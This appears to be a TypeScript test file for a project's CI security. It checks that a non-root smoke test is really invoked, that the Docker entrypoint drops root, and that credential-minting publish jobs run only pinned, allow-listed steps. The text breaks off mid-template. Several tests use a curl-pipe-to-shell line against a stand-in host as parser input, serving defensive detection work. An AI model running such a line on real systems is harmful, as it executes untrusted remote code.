import * as fs from 'fs';
import * as path from 'path';
import * as yaml from 'js-yaml';
import { executableLines, executableLinesConservative } from './workflow-lines';

/**
 * The published image has no `USER` directive by design: docker-entrypoint.sh starts as root to fix
 * named-volume ownership and then drops via `exec gosu openwa`. That drop is the only thing keeping
 * an internet-facing Node process (and its Chromium subprocess) off uid 0, and
 * `scripts/smoke-test-non-root.sh` is the only check of it.
 *
 * The script existed but no workflow ran it — its sole appearance in ci.yml was inside a comment
 * explaining why shellcheck names it. A change that left the process as root therefore passed lint,
 * every test job, the multi-arch build, the boot smoke and the image scan, and was promoted to
 * `latest`. These pin that the script is INVOKED, because a mention is not a gate.
 */

const workflowDir = path.join(__dirname, '..', '..', '.github', 'workflows');

type Step = { name?: string; run?: string; uses?: string; with?: unknown; env?: unknown };
type Workflow = { jobs?: Record<string, { steps?: Step[] }> };

// The shell skips a space and a tab and nothing else. Each of these is a character that JavaScript treats as
// white space (String.trim(), `\s`) and the shell reads as part of a word: `<U+a0>set` is a command of that
// name (127), and one before a `#` leaves the `#` inside the word, so no comment starts there.
const BLANK_LOOKALIKES = [0xa0, 0x0b, 0x0c, 0x3000, 0xfeff].map(code => String.fromCharCode(code));

function workflowOf(file: string): Workflow {
  return yaml.load(fs.readFileSync(path.join(workflowDir, file), 'utf8')) as Workflow;
}

// What each step runs, for a check that something IS run: a command named only behind a `#` that may start
// a comment does not count. Every caller is such a check, so it reads conservatively.
function runCommandsOf(source: string | Workflow): string[] {
  const workflow = typeof source === 'string' ? workflowOf(source) : source;
  return Object.values(workflow.jobs ?? {}).flatMap(job =>
    (job.steps ?? []).map(step => executableLinesConservative(step.run ?? '')),
  );
}

/**
 * Jobs that execute a repo-relative path, paired with whether the job ever checks the repo out.
 *
 * Both spellings count: `./scripts/x.sh` and the bare `scripts/x.sh` an interpreter is handed
 * (`bash scripts/x.sh`). Matching only the dotted form would leave the gate blind to the other way
 * of writing the very call it exists to protect.
 */
function jobsRunningRepoScripts(file: string): Array<{ job: string; scripts: string[]; hasCheckout: boolean }> {
  const REPO_PATH = /(?:^|[\s'"])(\.\/[\w./-]+|(?:scripts|bin|tools)\/[\w./-]+)/g;
  return Object.entries(workflowOf(file).jobs ?? {})
    .map(([job, def]) => {
      const steps = def.steps ?? [];
      const scripts = steps.flatMap(step => [...(step.run ?? '').matchAll(REPO_PATH)].map(m => m[1]));
      return { job, scripts, hasCheckout: steps.some(step => (step.uses ?? '').startsWith('actions/checkout')) };
    })
    .filter(entry => entry.scripts.length > 0);
}

describe('the non-root drop is enforced, not merely documented', () => {
  // A `run:` extractor that silently matched nothing would make every assertion below vacuously
  // pass. Anchor it on a script the workflows have always invoked.
  it('extracts run commands from the workflows', () => {
    expect(runCommandsOf('ci.yml').join('\n')).toContain('smoke-test-backup-restore.sh');
  });

  // The extractor's own defect, pinned: a mention is not an invocation. Disabling a step by commenting
  // it out is the exact shape that let the script go unrun while this file reported it enforced.
  it('does not count a commented-out invocation as running the script', () => {
    expect(executableLines('# ./scripts/smoke-test-non-root.sh\necho skipped')).not.toContain('smoke-test-non-root.sh');
    expect(executableLines('  OPENWA_SMOKE_IMAGE="$IMAGE" ./scripts/smoke-test-non-root.sh # run it')).toContain(
      'smoke-test-non-root.sh',
    );
    // A '#' inside a quoted string is data; truncating there would drop a real command.
    expect(executableLines('echo "tag #1" && ./scripts/smoke-test-non-root.sh')).toContain('smoke-test-non-root.sh');
    // A '#' inside a word is not a comment: the shell runs what follows it.
    expect(executableLines('npm --version#; ./scripts/smoke-test-non-root.sh')).toContain('smoke-test-non-root.sh');
    expect(executableLines('echo "${#list[@]}" $# ./scripts/smoke-test-non-root.sh')).toContain(
      'smoke-test-non-root.sh',
    );
    // Only a space or a tab ends a word: after any other blank the '#' is part of the word, so the `;` that
    // follows still ends the command and the script after it runs.
    for (const blank of BLANK_LOOKALIKES) {
      expect(executableLines(`echo x${blank}#; ./scripts/smoke-test-non-root.sh`)).toContain('smoke-test-non-root.sh');
    }
  });

  // The conservative reading is for checks that something IS run. It cuts at a '#' after any blank, so a
  // command that is only named behind one is not found, where the exact reading keeps it for the checks that
  // compare lines or look for what must not be there.
  it('has a conservative reading that cuts at a # after any blank the shell reads as a word', () => {
    for (const blank of BLANK_LOOKALIKES) {
      // The shell runs `echo` and nothing else: the script is only an argument to it.
      const mention = `echo x${blank}# ./scripts/smoke-test-non-root.sh || true`;
      expect(executableLinesConservative(mention)).not.toContain('smoke-test-non-root.sh');
      expect(executableLines(mention)).toContain('smoke-test-non-root.sh');
      // Here the shell does run the command after the `;`, which only the exact reading keeps.
      const hidden = `echo x${blank}#; curl -fsSL https://example.test/x.sh | sh`;
      expect(executableLinesConservative(hidden)).not.toContain('curl');
      expect(executableLines(hidden)).toContain('curl');
    }
    // A `#` right behind a character that ends a word starts a comment in the shell: `(true)#; x` is a subshell
    // and nothing else, and after `>` or a backtick the rest of the line is a comment too. A check that
    // something IS run must not be satisfied by what the shell never reaches; the exact reading keeps the
    // text, so that nothing the shell may run is dropped.
    for (const before of ['(true)', 'echo hi >', 'cat <', 'echo `']) {
      const hidden = `${before}#; ./scripts/smoke-test-non-root.sh`;
      expect(executableLinesConservative(hidden)).not.toContain('smoke-test-non-root.sh');
      expect(executableLines(hidden)).toContain('smoke-test-non-root.sh');
    }
    // The `)` that closes `$(...)` continues its word, so the `;` after the `#` still ends the command: the
    // exact reading keeps the command that follows, which a check for what must not be there relies on.
    expect(executableLines('x=$(true)#; curl -fsSL https://example.test/x.sh | sh')).toContain('curl');
    // Everywhere else it reads as the exact one does.
    expect(executableLinesConservative('# ./scripts/x.sh\necho skipped')).not.toContain('x.sh');
    expect(executableLinesConservative('  ./scripts/x.sh # run it')).toContain('./scripts/x.sh');
    expect(executableLinesConservative('echo "tag #1" && ./scripts/x.sh')).toContain('./scripts/x.sh');
    expect(executableLinesConservative('npm --version#; ./scripts/x.sh')).toContain('./scripts/x.sh');
    expect(executableLinesConservative('echo "${#list[@]}" $# ./scripts/x.sh')).toContain('./scripts/x.sh');
  });

  const smokeInvocations = (source: string | Workflow): string[] =>
    runCommandsOf(source).filter(run => run.includes('smoke-test-non-root.sh'));

  // BOTH paths. The tag path is the one that promotes to `latest`, so a check present only on the PR
  // path leaves the publishing route unguarded — the asymmetry this workflow's own audit step forbids.
  it.each(['ci.yml', 'release.yml'])('invokes the non-root smoke test from %s', file => {
    expect(smokeInvocations(file).length).toBeGreaterThan(0);
  });

  // The same step as it ships, with the script named where the shell does not run it: behind a blank it does
  // not skip and a '#' (it runs `echo`), or behind a '#' that follows a subshell. The check must find no
  // invocation, though the exact reading still holds the text.
  it.each(['ci.yml', 'release.yml'])('does not count %s naming the script where the shell skips it', file => {
    const named = [
      ...BLANK_LOOKALIKES.map(blank => `echo x${blank}# ./scripts/smoke-test-non-root.sh || true`),
      '(true)#; ./scripts/smoke-test-non-root.sh',
    ];
    for (const run of named) {
      const copy = JSON.parse(JSON.stringify(workflowOf(file))) as Workflow;
      const steps = Object.values(copy.jobs ?? {})
        .flatMap(job => job.steps ?? [])
        .filter(step => (step.run ?? '').includes('smoke-test-non-root.sh'));
      expect(steps.length).toBeGreaterThan(0);
      for (const step of steps) step.run = run;
      expect([run, smokeInvocations(copy)]).toEqual([run, []]);
      expect(steps.every(step => executableLines(step.run ?? '').includes('smoke-test-non-root.sh'))).toBe(true);
    }
  });

  // The Dockerfile relies on the entrypoint's gosu drop rather than a USER directive. If that ever
  // changes to a real USER line the smoke test still passes, but this records WHY the directive is
  // absent, so its absence is never read as an oversight and "fixed" by deleting the drop.
  it('keeps the entrypoint gosu drop the image depends on', () => {
    const entrypoint = fs.readFileSync(path.join(__dirname, '..', '..', 'docker-entrypoint.sh'), 'utf8');
    expect(entrypoint).toMatch(/exec\s+gosu\s+openwa/);
  });

  // A start as any other uid (runAsUser, `--user`) holds no CAP_CHOWN or CAP_SETUID, so it must leave
  // before the first chown and the gosu drop: under `set -e` either one exits, and the container
  // restarts in a loop. It must also refuse a data volume it cannot write, naming the cause.
  it('lets a non-root start skip every chown and the gosu drop', () => {
    const entrypoint = fs.readFileSync(path.join(__dirname, '..', '..', 'docker-entrypoint.sh'), 'utf8');
    const exit = entrypoint.search(/^if \[ "\$\(id -u\)" != 0 \]; then\n\s+exec "\$@"\nfi$/m);
    const firstChown = entrypoint.search(/^\s*(?:chown|find\b.*-exec chown)\b/m);
    expect(exit).toBeGreaterThan(-1);
    expect(firstChown).toBeGreaterThan(exit);
    expect(entrypoint.search(/^exec gosu openwa/m)).toBeGreaterThan(exit);
    expect(entrypoint).toMatch(/FATAL: \$dir is not writable by uid/);
  });

  // runAsUser, fsGroup and `--user` name a number, so the image has to guarantee it rather than take
  // whatever `useradd -r` finds free after the apt layers.
  it('pins the openwa uid and gid that the chart and docs name', () => {
    const dockerfile = fs.readFileSync(path.join(__dirname, '..', '..', 'Dockerfile'), 'utf8');
    const values = fs.readFileSync(path.join(__dirname, '..', '..', 'charts', 'openwa', 'values.yaml'), 'utf8');
    expect(dockerfile).toMatch(/^RUN groupadd -r -g 997 openwa && useradd -r -u 997 -g openwa openwa$/m);
    expect(values).toMatch(/runAsUser: 997/);
    expect(values).toMatch(/fsGroup: 997/);
  });

  // The Dockerfile explains the missing USER directive by pointing at the entrypoint. A line number
  // goes stale on the next entrypoint edit and sends the reader to the wrong statement.
  it('does not cite entrypoint line numbers from the Dockerfile', () => {
    const dockerfile = fs.readFileSync(path.join(__dirname, '..', '..', 'Dockerfile'), 'utf8');
    expect(dockerfile).toContain('docker-entrypoint.sh ends with');
    expect(dockerfile).not.toMatch(/docker-entrypoint\.sh:\d/);
    expect(dockerfile).not.toMatch(/chowns? on lines? \d/);
  });

  // Chromium's Singleton* locks, a relocated session profile and a backup staging copy are all
  // symlinks under /app/data. A bind mount that refuses to chown a symlink (Docker Desktop file
  // sharing) failed a recursive chown under `set -e` and crash-looped the container (#1722), and a
  // lock cleanup can only cover the default path. The ownership fix itself has to skip links.
  // `-h` too: find tests the type before the batched chown runs, so without it a path replaced by a
  // link in between would have root re-own the link's target. Only wrong-owned paths are chowned: a
  // chown is a metadata write even when nothing changes, so re-owning the whole volume on every start
  // held boot for minutes on a large one. The ownership test is parenthesised so `! -type l` still
  // governs both of its branches.
  it('re-owns only wrong-owned paths under /app/data, never symlinks', () => {
    const entrypoint = fs.readFileSync(path.join(__dirname, '..', '..', 'docker-entrypoint.sh'), 'utf8');
    const cleanup = entrypoint.search(/^rm -f \/app\/data\/sessions\/\*\/Singleton\*/m);
    const chown = entrypoint.search(
      /^find \/app\/data ! -type l \\\( ! -user openwa -o ! -group openwa \\\) -exec chown -h openwa:openwa \{\} \+$/m,
    );
    expect(entrypoint).not.toMatch(/^\s*chown\s+-R\b.*\/app\/data/m);
    // Swallowing the failure would hide a real refusal (NFS root_squash, SELinux).
    expect(entrypoint).not.toMatch(/-exec chown[^\n]*\|\|/);
    expect(cleanup).toBeGreaterThan(-1);
    expect(chown).toBeGreaterThan(-1);
    expect(cleanup).toBeLessThan(chown);
  });
});

/**
 * Invoking the script is not the same as being able to run it. `boot-smoke` in release.yml called
 * `./scripts/smoke-test-non-root.sh` from a job that never checks the repo out — the file is simply
 * absent from the workspace, so the step exits 127 and the ONLY path that publishes `latest` fails
 * at every tag. Fail-closed, but the release path was broken rather than guarded.
 *
 * The gate above could not see it: it binds the text of `run:`, and the text was correct. This binds
 * the precondition instead, for every job in every workflow — a repo-relative command needs the repo.
 */
describe('a job that runs a repo script checks the repo out', () => {
  const workflows = fs.readdirSync(workflowDir).filter(f => f.endsWith('.yml') || f.endsWith('.yaml'));

  // Non-vacuity control: the finder must actually see jobs, or every assertion below passes on an
  // empty set. Anchor on a workflow known to run repo scripts.
  it('finds jobs that run repo-relative scripts', () => {
    expect(workflows.length).toBeGreaterThan(0);
    const all = workflows.flatMap(f => jobsRunningRepoScripts(f));
    expect(all.length).toBeGreaterThan(0);
    expect(all.some(e => e.scripts.some(s => s.includes('scripts/')))).toBe(true);
  });

  it.each(workflows)('%s: every job running ./… also runs actions/checkout', file => {
    const offenders = jobsRunningRepoScripts(file)
      .filter(entry => !entry.hasCheckout)
      .map(entry => `${entry.job} runs ${entry.scripts.join(', ')} without actions/checkout`);
    expect(offenders).toEqual([]);
  });
});

/**
 * A job granted `id-token: write` can mint a registry publish credential, so every tool it installs
 * runs with that ability. A floating spec (`npm@latest`, a bare major) resolves to whatever was
 * published most recently at tag time; pin the exact version the way the Dockerfile pins its npm.
 *
 * Python installs cannot be pinned that way: `pip install` resolves the ranges in pyproject.toml, and
 * `python -m build` fetches its build backend into an isolated environment no pin reaches. The same
 * holds for pipx, uv, uvx, poetry, pdm, hatch, flit and pyproject-build. So an id-token job runs none of them; the
 * install, test and build happen in a job without the grant.
 *
 * Those two families are checked in every workflow. Any other installer (npx, a local npm install, gem,
 * go) is caught by the allow-list further down, which holds each id-token job (the two SDK publish jobs and
 * the image promote job) to the commands, actions, inputs and keys it names and refuses an id-token job it
 * has no list for.
 *
 * The allow-list reads a job as a set: a command, an action or an input value that is permitted anywhere is
 * permitted everywhere, and a job could run one twice, run it before the check it follows, or hand a step the
 * secret of another. Each job therefore also has a template: its steps one by one, in order, each with the
 * exact keys, inputs, env and script lines it may carry. The job's own step list must equal it.
 *
 * To add, remove or reorder a step of one of these jobs on purpose, edit that job's template (JS_PUBLISH,
 * PYTHON_PUBLISH or IMAGE_PROMOTE below), one entry per step in the order the steps run. That is the only
 * edit: the set-level lists are derived from the templates, and the control cases further down find their
 * steps and script lines in the templates by name and by text. A case that names a step it removes or
 * renames is changed with it. A bump of an action to a newer commit, and a change to a comment, need no edit
 * at all, unless the comment holds a `${{` expression, which is refused whatever the template says. While
 * the step sequence itself is wrong the content of the steps is not compared, so the sequence is fixed first
 * and the next failure then names the step.
 */
describe('a job that can mint a publish credential pins global npm installs and runs no Python installer', () => {
  type Permissions = Record<string, string> | string | null | undefined;
  type OidcJob = { permissions?: Permissions; steps?: Step[]; [key: string]: unknown };
  type OidcWorkflow = { permissions?: Permissions; jobs?: Record<string, OidcJob>; [key: string]: unknown };
  const workflows = fs.readdirSync(workflowDir).filter(f => f.endsWith('.yml') || f.endsWith('.yaml'));
  // Options before a subcommand, each optionally followed by one value (`--prefix /usr/local`).
  const OPTS = String.raw`(?:[ \t]+-\S+(?:[ \t]+[^\s-]\S*)?)*`;
  // Options may sit before the subcommand or anywhere after it: group 1 holds the leading ones, group 2
  // the rest of the command, and the global flag may be in either.
  const NPM_INSTALL = new RegExp(String.raw`\bnpm(${OPTS})[ \t]+(?:install|i|add)\b([^\n;&|]*)`, 'g');
  const GLOBAL_FLAG = /(?:^|\s)(?:-g|--global|--location[= \t]global)(?=\s|$)/;
  // `pip`, `pip3`, `python -m pip` and `uv pip` all contain `pip install`; every tool may take options
  // before its subcommand (`uv --directory sdk/python build`).
  const PYTHON_INSTALL = new RegExp(
    [
      String.raw`\bpip[\d.]*${OPTS}[ \t]+(?:install|wheel|download)\b`,
      String.raw`\bpython[\d.]*${OPTS}[ \t]+-m[ \t]*build\b`,
      String.raw`\bpyproject-build\b`,
      String.raw`\buvx\b`,
      String.raw`\bpipx${OPTS}[ \t]+(?:install|run)\b`,
      String.raw`\buv${OPTS}[ \t]+(?:sync|build|run|add|tool)\b`,
      String.raw`\bpoetry${OPTS}[ \t]+(?:install|sync|update|lock|build|add|publish)\b`,
      String.raw`\bpdm${OPTS}[ \t]+(?:install|sync|update|add|build|publish)\b`,
      String.raw`\bhatch${OPTS}[ \t]+(?:build|publish|run|env)\b`,
      String.raw`\bflit${OPTS}[ \t]+(?:build|publish|install)\b`,
    ].join('|'),
    'g',
  );

  // A job without its own `permissions` inherits the workflow-level block; `write-all` grants id-token too.
  const grantsIdToken = (perms: Permissions): boolean =>
    perms === 'write-all' || (typeof perms === 'object' && perms !== null && perms['id-token'] === 'write');

  const loadOidcWorkflow = (source: string | OidcWorkflow): OidcWorkflow =>
    typeof source === 'string'
      ? (yaml.load(fs.readFileSync(path.join(workflowDir, source), 'utf8')) as OidcWorkflow)
      : source;

  const oidcJobs = (source: string | OidcWorkflow): Array<[string, OidcJob]> => {
    const workflow = loadOidcWorkflow(source);
    return Object.entries(workflow.jobs ?? {}).filter(([, def]) =>
      grantsIdToken(def.permissions !== undefined ? def.permissions : workflow.permissions),
    );
  };

  const oidcJobSteps = (source: string | OidcWorkflow): Array<{ job: string; step: Step }> =>
    oidcJobs(source).flatMap(([job, def]) => (def.steps ?? []).map(step => ({ job, step })));

  // Exact by default, which is what the searches for a forbidden installer need; a check that a command IS
  // there passes the conservative reading.
  const oidcJobRuns = (
    source: string | OidcWorkflow,
    read: (run: string) => string = executableLines,
  ): Array<{ job: string; run: string }> =>
    oidcJobSteps(source).map(({ job, step }) => ({ job, run: read(step.run ?? '') }));

  const globalInstallsInOidcJobs = (source: string | OidcWorkflow): Array<{ job: string; spec: string }> =>
    oidcJobRuns(source).flatMap(({ job, run }) =>
      [...run.matchAll(NPM_INSTALL)]
        .filter(match => GLOBAL_FLAG.test(`${match[1]} ${match[2]}`))
        .flatMap(match =>
          match[2]
            // `--location global` carries its value as a separate word, which is not a package spec.
            .replace(/--location[ \t]+global\b/g, '--location=global')
            .trim()
            .split(/\s+/)
            .filter(arg => !arg.startsWith('-'))
            .map(spec => ({ job, spec })),
        ),
    );

  const pythonInstallsInOidcJobs = (source: string | OidcWorkflow): string[] =>
    oidcJobRuns(source).flatMap(({ job, run }) => [...run.matchAll(PYTHON_INSTALL)].map(m => `${job}: ${m[0]}`));

  // Non-vacuity: the JS SDK release job installs its own npm, so the finder must see it.
  it('finds the global npm install in the JS SDK publish job', () => {
    expect(globalInstallsInOidcJobs('js-sdk-release.yml').map(entry => entry.spec)).toEqual([
      expect.stringMatching(/^npm@/),
    ]);
  });

  it('treats a job that inherits id-token: write or write-all from the workflow as able to mint', () => {
    const job = { steps: [{ run: 'npm install -g npm@latest' }] };
    expect(globalInstallsInOidcJobs({ permissions: { 'id-token': 'write' }, jobs: { publish: job } })).toHaveLength(1);
    expect(globalInstallsInOidcJobs({ permissions: 'write-all', jobs: { publish: job } })).toHaveLength(1);
    expect(globalInstallsInOidcJobs({ jobs: { publish: { ...job, permissions: 'write-all' } } })).toHaveLength(1);
    // A job-level block replaces the workflow-level one, so it can also withdraw the grant.
    expect(
      globalInstallsInOidcJobs({ permissions: 'write-all', jobs: { publish: { ...job, permissions: {} } } }),
    ).toHaveLength(0);
  });

  it('finds a global npm install whatever the order of its flags', () => {
    const commands = [
      'npm install npm@latest --global',
      'npm -g install npm@latest',
      'npm install --no-fund -g npm@latest',
      'npm i npm@11 -g',
      'npm add --location=global npm@latest',
      'npm --prefix /usr/local install -g npm@latest',
      'npm --location global install npm@latest',
      'npm install --location global npm@11.2.0',
    ];
    const job: OidcWorkflow = {
      jobs: { publish: { permissions: { 'id-token': 'write' }, steps: commands.map(run => ({ run })) } },
    };
    expect(globalInstallsInOidcJobs(job).map(entry => entry.spec)).toEqual([
      'npm@latest',
      'npm@latest',
      'npm@latest',
      'npm@11',
      'npm@latest',
      'npm@latest',
      'npm@latest',
      'npm@11.2.0',
    ]);
    // A local install and a clean install grant nothing global.
    const local: OidcWorkflow = {
      jobs: {
        publish: { permissions: { 'id-token': 'write' }, steps: [{ run: 'npm ci\nnpm install --no-save foo' }] },
      },
    };
    expect(globalInstallsInOidcJobs(local)).toEqual([]);
  });

  it.each(workflows)('%s: global installs in id-token jobs are pinned to an exact version', file => {
    const floating = globalInstallsInOidcJobs(file).filter(entry => !/@\d+\.\d+\.\d+$/.test(entry.spec));
    expect(floating).toEqual([]);
  });

  // Non-vacuity: the single-job shape the PyPI release used to have, and the Python install that
  // still exists in the release workflow, just outside the id-token job.
  it('finds pip installs and python -m build in an id-token job', () => {
    const singleJob: OidcWorkflow = {
      jobs: {
        publish: {
          permissions: { contents: 'read', 'id-token': 'write' },
          steps: [
            { run: "pip install -e '.[dev]'\npytest" },
            { run: 'python -m pip install --upgrade build\npython -m build' },
          ],
        },
      },
    };
    expect(pythonInstallsInOidcJobs(singleJob)).toEqual([
      'publish: pip install',
      'publish: pip install',
      'publish: python -m build',
    ]);
    expect(runCommandsOf('python-sdk-release.yml').join('\n')).toMatch(PYTHON_INSTALL);
  });

  it('finds the other Python installers and build frontends in an id-token job', () => {
    const commands = [
      'pipx install twine',
      'pipx run build',
      'uvx twine upload dist/*',
      'uv sync',
      'uv build',
      'uv tool install twine',
      'poetry install',
      'poetry build',
      'poetry sync',
      'poetry update',
      'poetry publish --build',
      'pdm install',
      'hatch build',
      'flit publish',
      'pyproject-build',
      'python -m pip wheel .',
      'pip -q install twine',
      'python -m pip --quiet install build',
      'poetry --no-interaction publish --build',
      'poetry -C sdk/python build',
      'uv --directory sdk/python build',
      'uv -q sync',
      'pdm -p sdk/python build',
      'hatch -e default build',
      'pipx --verbose run build',
      'python -I -m build',
      'python -W ignore -m build',
      'pip --cache-dir /tmp/x install twine',
    ];
    const job: OidcWorkflow = {
      jobs: { publish: { permissions: { 'id-token': 'write' }, steps: commands.map(run => ({ run })) } },
    };
    expect(pythonInstallsInOidcJobs(job)).toHaveLength(commands.length);
  });

  it.each(workflows)('%s: id-token jobs run no Python installer or build frontend', file => {
    expect(pythonInstallsInOidcJobs(file)).toEqual([]);
  });

  // The toolchains (the install, the test runner, the compiler that builds dist/) are third-party code as
  // well, so they run in jobs without the grant, and a job that has it runs a short, fixed set of lines. An
  // allow-list, not a list of what to avoid: the SDK publish jobs upload the artifact their build job made
  // and tested, and the image promote job re-points tags at a manifest that was already built and
  // smoke-tested. Any other command (a local install, node, another package manager, a script of the
  // repository), action, input or key is new code running beside the credential, so it has to be added
  // here on purpose. A job that gains the grant without an entry is refused by name.
  //
  // Comments are ignored, with one exception: GitHub expands `${{ }}` in the whole script before the shell
  // starts, so an expression in a comment is evaluated all the same, and a step that holds one there is
  // refused by name.
  //
  // A string is an exact match; a RegExp is anchored by its author and used only where a line varies.
  type Allowed = string | RegExp;
  // One step of an id-token job as it may appear. A step is identified by its `name`, or by its action when
  // it has none, so a renamed step reads as one removed and another added.
  type StepTemplate = {
    name?: string;
    // The action without its ref: the step must pin it to a 40-hex commit, whichever commit that is.
    uses?: string;
    id?: string;
    // Exactly these inputs, each with the one value (or pattern) it may take.
    with?: Record<string, Allowed>;
    // Exactly these names, each with the one value (or pattern) it may take.
    env?: Record<string, Allowed>;
    // The executable lines of the script, in order, with nothing between them.
    run?: Allowed[];
  };
  type JobAllowList = {
    // The job's whole step list, in the order the steps run.
    steps: StepTemplate[];
    // Whole lines of a `run`, once comments and surrounding space are gone.
    commands: Allowed[];
    // Each action by name (it must be pinned to a commit), with the inputs it may be given and the values
    // each may take. An input that is not named is refused: `repository-url`, `registry`, `run-id`,
    // `github-token`, `digest-mismatch` and `push-to-registry` all change where the bytes go or come from.
    actions: Record<string, Record<string, Allowed[]>>;
    // A step key that injects code or changes what it runs under (env, shell, working-directory, if), and
    // a job key that does the same for every step. `env` is read name by name where it is allowed.
    stepKeys: string[];
    jobKeys: string[];
    // The one level each scope is held at; a scope that is not listed is held at none. A level that differs
    // is refused, a lesser one and a scope the job has dropped included, so a drop is seen here and not on
    // the tag run.
    permissions: Record<string, string>;
    // Step `env`: each name with the values it may take.
    env: Record<string, Allowed[]>;
    // Where and when the job runs, each held at the one value the workflow gives it. `runs-on` names the
    // machine that executes the job beside the credential, which a self-hosted runner outlives, `needs` the
    // jobs it follows, and `timeout-minutes` how long it may hold the credential.
    runsOn: string;
    needs: string[];
    timeout: number;
  };
  // `workflowEnv` names what the workflow sets for every job; `defaults` is never allowed.
  type FileAllowList = { workflowEnv: string[]; jobs: Record<string, JobAllowList> };

  // The set view of a step list that the key-level check reads: every line, every input value and every env
  // value some step may carry. Derived, so the template is the one place a step is edited and the two checks
  // cannot disagree about what is permitted.
  const flatten = (steps: StepTemplate[]): Pick<JobAllowList, 'commands' | 'actions' | 'env'> => {
    const actions: JobAllowList['actions'] = {};
    const env: JobAllowList['env'] = {};
    for (const step of steps) {
      if (step.uses !== undefined) {
        const inputs = (actions[step.uses] ??= {});
        for (const [key, value] of Object.entries(step.with ?? {})) (inputs[key] ??= []).push(value);
      }
      for (const [name, value] of Object.entries(step.env ?? {})) (env[name] ??= []).push(value);
    }
    return { commands: steps.flatMap(step => step.run ?? []), actions, env };
  };

  // The three typographic dashes, named by code point: written out, a lookalike reads as a hyphen in a diff.
  const DASH_GLYPHS = [0x2013, 0x2014, 0x2015].map(code => String.fromCharCode(code));
  const EM_DASH = DASH_GLYPHS[1];

  const SDK_PUBLISH_KEYS = {
    stepKeys: ['name', 'uses', 'run', 'with'],
    jobKeys: ['needs', 'runs-on', 'timeout-minutes', 'permissions', 'steps'],
    permissions: { contents: 'read', 'id-token': 'write' },
    runsOn: 'ubuntu-latest',
    needs: ['build'],
    timeout: 15,
  };
  // The npm that comes with the Node image cannot do trusted publishing, so the job installs one, pinned
  // to an exact release, and only then uploads the tarball its build job made.
  const JS_PUBLISH: StepTemplate[] = [
    { uses: 'actions/setup-node', with: { 'node-version': /^\d+$/ } },
    {
      name: 'Use an npm that supports trusted publishing',
      run: [
        /^npm install -g npm@\d+\.\d+\.\d+$/,
        'npm_bundle_dir="$(npm root --global)/npm/node_modules"',
        `node -e "if (require(process.argv[1]).version !== '6.29.0') throw new Error('Recheck npm Undici replacement');" "$npm_bundle_dir/undici/package.json"`,
        'npm_http_patch_dir=$(mktemp -d)',
        'npm install --prefix "$npm_http_patch_dir" --no-save --package-lock=false --ignore-scripts --no-audit --fund=false undici@6.29.1',
        'rm -rf "$npm_bundle_dir/undici"',
        'mv "$npm_http_patch_dir/node_modules/undici" "$npm_bundle_dir/undici"',
        'rm -rf "$npm_http_patch_dir"',
        'npm --version',
      ],
    },
    { uses: 'actions/download-artifact', with: { name: 'js-sdk-package', path: 'package/' } },
    {
      name: 'Publish to npm (trusted publishing, provenance automatic)',
      run: ['npm publish "$GITHUB_WORKSPACE"/package/*.tgz --access public --ignore-scripts'],
    },
  ];
  const JS_SDK_RELEASE: FileAllowList = {
    workflowEnv: [],
    jobs: { publish: { ...SDK_PUBLISH_KEYS, steps: JS_PUBLISH, ...flatten(JS_PUBLISH) } },
  };
  // No `run` at all: the job downloads the distributions and the PyPA action uploads them.
  const PYTHON_PUBLISH: StepTemplate[] = [
    { uses: 'actions/download-artifact', with: { name: 'python-sdk-dist', path: 'sdk/python/dist/' } },
    {
      name: 'Publish to PyPI (trusted publishing)',
      uses: 'pypa/gh-action-pypi-publish',
      with: { 'packages-dir': 'sdk/python/dist' },
    },
  ];
  const PYTHON_SDK_RELEASE: FileAllowList = {
    workflowEnv: [],
    jobs: { publish: { ...SDK_PUBLISH_KEYS, steps: PYTHON_PUBLISH, ...flatten(PYTHON_PUBLISH) } },
  };
  // The re-point is safe only because of the order: log in, name the image, attest the tested digest, then
  // move the tags, each checked to resolve to that digest, then verify what the public can pull. The first
  // login names the registry (ghcr.io) with the run's own token; the second takes the Docker Hub default
  // with a secret of its own, and a step of one never takes the other's value.
  const IMAGE_PROMOTE: StepTemplate[] = [
    { name: 'Set up Docker Buildx', uses: 'docker/setup-buildx-action' },
    {
      name: 'Login to GitHub Container Registry',
      uses: 'docker/login-action',
      with: { registry: 'ghcr.io', username: '${{ github.actor }}', password: '${{ secrets.GITHUB_TOKEN }}' },
    },
    {
      name: 'Login to Docker Hub',
      uses: 'docker/login-action',
      with: { username: '${{ secrets.DOCKERHUB_USERNAME }}', password: '${{ secrets.DOCKERHUB_TOKEN }}' },
    },
    {
      name: 'Resolve the image name to attest',
      id: 'image',
      env: { REPO: '${{ github.repository }}' },
      run: ['echo "name=ghcr.io/${REPO,,}" >> "$GITHUB_OUTPUT"'],
    },
    {
      name: 'Attest build provenance for the tested digest',
      uses: 'actions/attest',
      with: {
        'subject-name': '${{ steps.image.outputs.name }}',
        'subject-digest': '${{ needs.docker.outputs.digest }}',
      },
    },
    {
      name: 'Tag the smoke-tested image with the release tags',
      env: {
        REPO: '${{ github.repository }}',
        REF_NAME: '${{ github.ref_name }}',
        TAGS: '${{ needs.release-tags.outputs.tags }}',
        EXPECTED_DIGEST: '${{ needs.docker.outputs.digest }}',
      },
      // The echoed messages carry an em dash; a line is compared as written, so it is named here too.
      run: [
        'set -euo pipefail',
        'staging="ghcr.io/${REPO,,}:smoke-${{ github.run_id }}"',
        'actual="$(docker buildx imagetools inspect "$staging" --format \'{{.Manifest.Digest}}\')"',
        'if [ "$actual" != "$EXPECTED_DIGEST" ]; then',
        `echo "::error::staging digest $actual != build digest $EXPECTED_DIGEST ${EM_DASH} refusing to promote untested content"`,
        'exit 1',
        'fi',
        'promoted=0',
        'while IFS= read -r tag; do',
        '[ -n "$tag" ] || continue',
        'if [[ "$REF_NAME" == *-* ]] && [[ "$tag" =~ :[0-9]+\\.[0-9]+$ ]]; then',
        `echo "skipping $tag ${EM_DASH} minor tags are not promoted from a prerelease"`,
        'continue',
        'fi',
        'echo "promoting -> $tag"',
        'docker buildx imagetools create --tag "$tag" "$staging"',
        'promoted_digest="$(docker buildx imagetools inspect "$tag" --format \'{{.Manifest.Digest}}\')"',
        'if [ "$promoted_digest" != "$EXPECTED_DIGEST" ]; then',
        'echo "::error::$tag resolved to $promoted_digest after promotion, expected $EXPECTED_DIGEST"',
        'exit 1',
        'fi',
        'promoted=$((promoted + 1))',
        'done <<< "$TAGS"',
        'if [ "$promoted" -eq 0 ]; then',
        `echo "::error::no release tags were produced by metadata-action ${EM_DASH} nothing was promoted"`,
        'exit 1',
        'fi',
        'echo "promoted $promoted tag(s), all digest-identical to the tested build"',
      ],
    },
    {
      name: 'Verify the release tag resolves and is multi-arch',
